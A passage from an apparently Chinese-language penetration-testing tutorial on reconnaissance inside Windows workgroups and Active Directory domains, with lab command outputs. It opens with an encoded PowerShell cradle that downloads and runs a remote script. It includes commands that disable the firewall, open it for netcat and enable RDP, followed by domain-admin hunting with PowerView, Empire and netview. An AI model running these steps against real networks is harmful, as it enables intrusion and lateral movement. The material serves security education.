SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-06_18-40-25.png"></p><h1 id="0x03-本地工作组信息收集"><a href="#0x03-本地工作组信息收集" class="headerlink" title="0x03 本地工作组信息收集"></a>0x03 本地工作组信息收集</h1><h2 id="1、手动收集本地工作组信息"><a href="#1、手动收集本地工作组信息" class="headerlink" title="1、手动收集本地工作组信息"></a>1、手动收集本地工作组信息</h2><ul><li>查看当前权限</li></ul><pre class="line-numbers language-none"><code class="language-none">whoami <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>本机网络配置信息</li></ul><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>操作系统和版本信息（英文版）</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>操作系统和版本信息（中文版）</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS 名称&quot; &#x2F;C:&quot;OS 版本&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看系统体系结构</li></ul><pre class="line-numbers language-none"><code class="language-none">echo %PROCESSOR_ARCHITECTURE%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看系统所有环境变量</li></ul><pre class="line-numbers language-none"><code class="language-none">set<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看安装的软件及版本和路径等信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic product get name,version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>利用 PowerShell 收集软件版本信息</li></ul><pre class="line-numbers language-none"><code class="language-none">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询本机服务信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic service list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询进程列表</li></ul><pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>wmic 查看进程信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic process list brief<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看启动程序信息</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看计划任务</li></ul><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看主机开启时间</li></ul><pre class="line-numbers language-none"><code class="language-none">net statistics workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询用户列表</li></ul><pre class="line-numbers language-none"><code class="language-none">net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 查看指定用户的信息</li></ul><pre class="line-numbers language-none"><code class="language-none">net user teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li> 查看本地管理员用户</li></ul><pre class="line-numbers language-none"><code class="language-none">net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看当前在线用户</li></ul><pre class="line-numbers language-none"><code class="language-none">query user || qwinsta<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>列出或断开本地计算机和连接的客户端的会话 </li></ul><pre class="line-numbers language-none"><code class="language-none">net session<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看端口列表</li></ul><pre class="line-numbers language-none"><code class="language-none">netstat –ano<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看补丁列表</li></ul><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 wmic 查看补丁列表</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic qfe get Caption,Description,HotFixID,InstalledOn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看本机共享</li></ul><pre class="line-numbers language-none"><code class="language-none">net share<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 wmic 查看共享列表</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查询路由表及所有可用接口的ARP 缓存表 </li></ul><pre class="line-numbers language-none"><code class="language-none">route printarp –a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>查询防火墙相关配置 </p><ul><li>关闭防火墙</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)netsh advfirewall set allprofiles state off(Windows Server 2003 系统之后版本)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>查看防火墙配置</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh firewall show config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>修改防火墙配置</li></ul><pre class="line-numbers language-none"><code class="language-none">(Windows Server 2003 系统及之前版本)允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable(Windows Server 2003 之后系统版本)允许指定程序连入netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C: \nc.exe&quot;允许 3389 端口放行netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>自定义防火墙日志储存位置</li></ul><pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看计算机代理配置情况 </p></li></ul><pre class="line-numbers language-none"><code class="language-none">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>查询并开启远程连接服务</p><ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul><pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h2 id="2、自动收集本地工作组信息"><a href="#2、自动收集本地工作组信息" class="headerlink" title="2、自动收集本地工作组信息"></a>2、自动收集本地工作组信息</h2><h3 id="wmic-脚本"><a href="#wmic-脚本" class="headerlink" title="wmic 脚本"></a>wmic 脚本</h3><p>wmic 脚本下载地址：<a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_12-59-56.png"></p><h3 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h3><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li><p>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</p></li><li><p>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</p></li></ul><p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_15-27-11.png"></p><p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><h1 id="0x04-域内信息收集"><a href="#0x04-域内信息收集" class="headerlink" title="0x04 域内信息收集"></a>0x04 域内信息收集</h1><h2 id="1、判断是否存在域"><a href="#1、判断是否存在域" class="headerlink" title="1、判断是否存在域"></a>1、判断是否存在域</h2><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。    </p><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; ipconfig &#x2F;allWindows IP 配置   主 DNS 后缀 . . . . . . . . . .  : teamssix.com   DNS 后缀搜索列表  . . . . . . . . : teamssix.com以太网适配器 Ethernet0:   IPv4 地址 . . . . . . . . . . .. : 192.168.7.110   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.7.1   DNS 服务器  . . . . . . . . . . . : 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP</p><pre class="line-numbers language-none"><code class="language-none">nslookup teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nslookup teamssix.com服务器:  UnKnownAddress:  192.168.7.7名称:    teamssix.comAddress:  192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统详细信息"><a href="#系统详细信息" class="headerlink" title="系统详细信息"></a>系统详细信息</h3><pre class="line-numbers language-none"><code class="language-none">systeminfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; systeminfo | findstr 域:域: teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="当前登录域与域用户"><a href="#当前登录域与域用户" class="headerlink" title="当前登录域与域用户"></a>当前登录域与域用户</h3><pre class="line-numbers language-none"><code class="language-none">net config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net config workstation | findstr 域工作站域                    TEAMSSIX工作站域 DNS 名称            teamssix.com登录域                      TEAMSSIX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net time &#x2F;domain\\dc.teamssix.com 的当前时间是 2021&#x2F;2&#x2F;13 20:49:56命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、收集域内基础信息"><a href="#2、收集域内基础信息" class="headerlink" title="2、收集域内基础信息"></a>2、收集域内基础信息</h2><h3 id="查看域"><a href="#查看域" class="headerlink" title="查看域"></a>查看域</h3><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net view &#x2F;domainDomain-------------------------------------------------------------------------------TEAMSSIX命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域内计算机"><a href="#查看域内计算机" class="headerlink" title="查看域内计算机"></a>查看域内计算机</h3><pre class="line-numbers language-none"><code class="language-none">net view &#x2F;domain:domain_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net view &#x2F;domain:teamssix服务器名称            注解-------------------------------------------------------------------------------\\DANIEL10\\DANIEL7\\DC命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域内用户组列表"><a href="#查看域内用户组列表" class="headerlink" title="查看域内用户组列表"></a>查看域内用户组列表</h3><pre class="line-numbers language-none"><code class="language-none">net group &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的组帐户-------------------------------------------------------------------------------*Admins*Domain Admins*Domain Computers*Domain Users*Enterprise Admins命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;Enterprise Admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &quot;Enterprise Admins&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Enterprise Admins注释     指定的公司系統管理員成员-------------------------------------------------------------------------------Administrator命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域密码策略信息"><a href="#查看域密码策略信息" class="headerlink" title="查看域密码策略信息"></a>查看域密码策略信息</h3><pre class="line-numbers language-none"><code class="language-none">net accounts &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net accounts &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。强制用户在时间到期之后多久必须注销?:     从不密码最短使用期限(天):                  1密码最长使用期限(天):                  42密码长度最小值:                        7保持的密码历史记录长度:                 24锁定阈值:                            从不锁定持续时间(分):                      30锁定观测窗口(分):                      30计算机角色:                           PRIMARY命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域信任信息"><a href="#查看域信任信息" class="headerlink" title="查看域信任信息"></a>查看域信任信息</h3><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;domain_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nltest &#x2F;domain_trusts域信任的列表:    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、收集域用户和管理员信息"><a href="#3、收集域用户和管理员信息" class="headerlink" title="3、收集域用户和管理员信息"></a>3、收集域用户和管理员信息</h2><h3 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><pre class="line-numbers language-none"><code class="language-none">net user &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net user &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的用户帐户-------------------------------------------------------------------------------admin                    Administrator                    daniel10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查询域用户详细信息"><a href="#查询域用户详细信息" class="headerlink" title="查询域用户详细信息"></a>查询域用户详细信息</h3><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; wmic useraccount get &#x2F;allAccountType  Caption                        Description                                                     Disabled  Domain    FullName                               InstallDate  LocalAccount  Lockout  Name                  PasswordChangeable  PasswordExpires  PasswordRequired  SID                                            SIDType  Status512          DANIEL10\Administrator         管理计算机(域)的内置帐户                                        TRUE      DANIEL10                                                      TRUE          FALSE    Administrator         TRUE                FALSE            TRUE              S-1-5-21-1097120846-822447287-3576165687-500   1        Degraded512          DANIEL10\DefaultAccount        系统管理的用户帐户。                                            TRUE      DANIEL10                                                      TRUE          FALSE    DefaultAccount        TRUE                FALSE            FALSE             S-1-5-21-1097120846-822447287-3576165687-503   1        Degraded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a>查询存在的用户</h3><pre class="line-numbers language-none"><code class="language-none">dsquery user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; dsquery user&quot;CN&#x3D;Administrator,CN&#x3D;Users,DC&#x3D;teamssix,DC&#x3D;com&quot;&quot;CN&#x3D;Guest,CN&#x3D;Users,DC&#x3D;teamssix,DC&#x3D;com&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常用的 dsquery 命令</p><pre class="line-numbers language-none"><code class="language-none">dsquery computer - 查找目录中的计算机dsquery contact - 查找目录中的联系人dsquery subnet - 查找目录中的子网dsquery group - 查找目录中的组dsquery ou - 查找目录中的组织单位dsquery site - 查找目录中的站点dsquery server - 查找目录中的域控制器dsquery user - 查找目录中的用户dsquery quota - 查找目录中的配额dsquery partition - 查找目录中的分区dsquery * - 用通用的 LDAP 查询查找目录中的任何对象<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、查找域控制器"><a href="#4、查找域控制器" class="headerlink" title="4、查找域控制器"></a>4、查找域控制器</h2><h3 id="查看域控器主机名"><a href="#查看域控器主机名" class="headerlink" title="查看域控器主机名"></a>查看域控器主机名</h3><pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;DCLIST:teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nltest &#x2F;DCLIST:teamssix获得域“teamssix”中 DC 的列表(从“\\DC”中)。    dc.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nslookup -type&#x3D;SRV _ldap._tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nslookup -type&#x3D;SRV _ldap._tcp_ldap._tcp.teamssix.com SRV service location:          priority       &#x3D; 0          weight         &#x3D; 100          port           &#x3D; 389          svr hostname   &#x3D; dc.teamssix.comdc.teamssix.com internet address &#x3D; 192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">netdom query pdc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; netdom query pdc域的主域控制器:DC命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看域控器组"><a href="#查看域控器组" class="headerlink" title="查看域控器组"></a>查看域控器组</h3><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain controllers&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; net group &quot;domain controllers&quot; &#x2F;domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Controllers注释     在網域所有的網域控制站成员-------------------------------------------------------------------------------DC$命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5、定位域管理员"><a href="#5、定位域管理员" class="headerlink" title="5、定位域管理员"></a>5、定位域管理员</h2><h3 id="psloggedon"><a href="#psloggedon" class="headerlink" title="psloggedon"></a>psloggedon</h3><p>在 Windows 上使用 <code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。</p><p>psloggedon 下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><pre class="line-numbers language-none"><code class="language-none">psloggedon.exe [-] [-l] [-x] [\\computername|username]-显示支持的选项和用于输出值的单位。-l仅显示本地登录，不显示本地和网络资源登录。-x不显示登录时间。\\computername指定要列出登录信息的计算机的名称。Username指定用户名，在网络中搜索该用户登录的计算机。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; PsLoggedon.exe -l \\192.168.7.7Users logged on locally:2021&#x2F;2&#x2F;13 20:53:08         TEAMSSIX\Administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。</p><p>PVEFindADUser 下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><pre class="line-numbers language-none"><code class="language-none">-h显示帮助信息-u检测程序是否有新版本-current [&quot;username&quot;]-current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC-noping阻止尝试枚举用户登录名之前对目标计算机执行ping命令-target此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; PVEFindADUser.exe -current [+] Finding currently logged on users ? true [+] Finding last logged on users ? false [+] Enumerating all computers... [+] Number of computers found : 15 [+] Launching queries     [+] Processing host : dc.teamssix.com (Windows Server 2008 R2 Datacenter;Service Pack 1)         - Logged on user : teamssix\administrator     [+] Processing host : daniel7.teamssix.com (Windows 7 专业版;Service Pack 1)     [+] Processing host : daniel10.teamssix.com (Windows 10 专业版) [+] Report written to report.csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="netview"><a href="#netview" class="headerlink" title="netview"></a>netview</h3><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p><p>Netview 下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><pre class="line-numbers language-none"><code class="language-none">-h               显示帮助信息-f filename.txt  指定要提取主机列表的文件-e filename.txt  指定要排除的主机名的文件-o filename.txt  将所有输出重定向到指定的文件-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索-c               对已找到的共享目录&#x2F;文件的访问权限进行检查-i interval      枚举主机之间等待的秒数-j jitter        应用于间隔的抖动百分比（0.0-1.0）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; netview.exe -d[+] Number of hosts: 3[+] Host: DANIEL10Enumerating AD Info[+] DANIEL10 - Comment -[+] D - OS Version - 10.0[+] DANIEL10 - MSSQL ServerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.110Enumerating Share InfoEnumerating Session InfoEnumerating Logged-on Users[+] DANIEL10 - Logged-on - TEAMSSIX\daniel10[+] Host: DCEnumerating AD Info[+] DC - Comment -[+] D - OS Version - 6.1[+] DC - Domain ControllerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.7……内容较多故省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h3><p>常用的 NSE 脚本如下：</p><p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p><p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p><p><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><p>NES 脚本下载地址：<a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p><pre class="line-numbers language-none"><code class="language-none">C:\Users\daniel10&gt; nmap --script&#x3D;smb-os-discovery.nse -p 445 192.168.7.107Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-21 09:44 CSTNmap scan report for 192.168.7.107Host is up (0.00053s latency).PORT    STATE SERVICE445&#x2F;tcp open  microsoft-dsHost script results:| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:&#x2F;o:microsoft:windows_7::sp1:professional|   Computer name: daniel7|   NetBIOS computer name: DANIEL7\x00|   Domain name: teamssix.com|   Forest name: teamssix.com|   FQDN: daniel7.teamssix.com|_  System time: 2021-02-21T09:44:33+08:00Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-23_17-38-11.png"></p><h3 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code> $Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p><p>接着在 powershell中输入<code> Import-Module PowerView</code>即可导入PowerView，使用<code> Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p><pre class="line-numbers language-none"><code class="language-none">PS C:\Users\daniel10&gt; Import-Module PowerViewPS C:\Users\daniel10&gt; Get-Command -Module PowerViewCommandType     Name                                               Version    Source-----------     ----                                               -------    ------Alias           Find-UserTrustGroup                                1.0        PowerViewAlias           Get-ComputerProperties                             1.0        PowerView……内容较多故省略……<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PowerView 脚本下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><blockquote><p>注：在打开上面的下载地址时会看到该项目已被转移到其他项目下，但是当我在使用新版本的 PowerView 脚本时，发现找不到<code>Invoke-StealthUserHunter</code>命令，而旧版本的 PowerView 